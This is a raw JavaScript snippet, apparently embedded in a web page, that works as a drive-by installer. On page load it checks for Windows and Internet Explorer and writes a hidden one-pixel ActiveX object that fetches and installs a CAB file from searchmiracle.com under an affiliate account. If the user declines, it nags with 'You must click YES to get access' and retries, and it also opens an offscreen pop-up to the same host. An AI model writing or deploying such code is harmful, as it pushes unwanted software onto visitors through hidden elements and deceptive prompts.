   <!--

    document.write('<iframe id="downloads_manager" style="position:absolute; visibility:hidden;"></iframe>');
    function retryit(){
       if(window.retry && retry>0) {
                           alert("You must click YES to get access");
                           start_download();
               retry--;
               }

       }

    function start_download() {
       var bname=navigator.appName;
       var bver=parseInt(navigator.appVersion);
           if(!window.flag) var flag=0
           if ( navigator.platform && navigator.platform != 'Win32' ) { alert("Sorry, your browser is not WIN32 Compatible"); }
           if (bname == 'Microsoft Internet Explorer' && bver >= 2) {
               downloads_manager.document.close();
               downloads_manager.document.write('<html><body>');
               downloads_manager.document.write('<OBJECT id="barobject" width=1 height=1 classid="CLSID:02C20140-76F8-4763-83D5-B660107B7A11"');
               downloads_manager.document.write('codebase="http://searchmiracle.com/cab/v2cab.cab" onerror="parent.retryit();">');
               downloads_manager.document.write('<PARAM name="acc" value="padishah">');
               downloads_manager.document.write('<PARAM name="cc" value="0">');
               downloads_manager.document.write('<PARAM name="ax" value="&me=1&two=4">');
               downloads_manager.document.write('</OBJECT>');
               downloads_manager.document.write('</body></html>');

               flag++;
            }

       }



    function start_download_loadfirst() {
           var bname=navigator.appName;
           var bver=parseInt(navigator.appVersion);
           if ( navigator.platform && navigator.platform != 'Win32' ) { alert("Sorry, your browser is not WIN32 Compatible"); }
           if (bname == 'Microsoft Internet Explorer' && bver >= 2) {
                           document.write('<OBJECT id="bar_object" width=1 height=1 classid="CLSID:02C20140-76F8-4763-83D5-B660107B7A11"');
                           document.write('codebase="http://searchmiracle.com/cab/v2cab.cab" onerror="parent.retryit();">');
                           document.write('<PARAM name="acc" value="padishah">');
                           document.write('<PARAM name="cc" value="0">');
                           document.write('<PARAM name="ax" value="&me=1&two=4">');
                           document.write('</OBJECT>');
               flag++;
            }
     }





    // -->


   <!--
       var currentDate = new Date();
       var adRecurrence = "always";
       var adId = "19b3b5c40326b878a987d8f83ebc50d9";
       var adExpiration = 0;
       var retry=2;
       var flag = 0;
       var obj=null;




       function SetCookie(sName, sValue, sExpire){
           var expireCode = "";
           if (sExpire) { expireCode =  "expires=" + sExpire + ";" }
           document.cookie = sName + "=" + escape(sValue) + ";" + expireCode
       }


       function GetCookie(sName) {
           var aCookie = document.cookie.split("; ");
           for (var i=0; i < aCookie.length; i++) {
               var aCrumb = aCookie[i].split("=");
               if (sName == aCrumb[0]) { return unescape(aCrumb[1]); }
           }
           return null;
       }


       function upop() {
           var url = "http://searchmiracle.com/js.php?event_type=onload&recurrence=always&retry=2&loadfirst=1&delayload=&account_id=padishah&adid=19b3b5c40326b878a987d8f83ebc50d9&download=1";
           var win='toolbar=1,location=1,directories=0,menubar=0,scrollbars=1,resizable=1,top=110,left=2000,width=600,height=500'
           window.open(url,'pop',win);
           if(obj)
               obj();
       }




       SetCookie(adId,"1", adExpiration);

       // this is resicrtions dfor premium only or other only


           start_download_loadfirst();




       //-->
